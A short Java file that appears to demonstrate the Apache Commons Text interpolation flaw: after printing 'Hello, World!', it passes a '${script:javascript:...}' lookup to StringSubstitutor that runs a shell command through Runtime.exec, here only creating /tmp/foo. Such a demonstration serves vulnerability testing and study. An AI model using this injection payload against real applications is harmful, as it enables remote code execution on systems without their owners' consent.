
import org.apache.commons.text.StringSubstitutor;

public class MyApp {

    public static void main(String[] args) {
        System.out.println("Hello, World!");


        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
        System.out.println(out);
    }
}
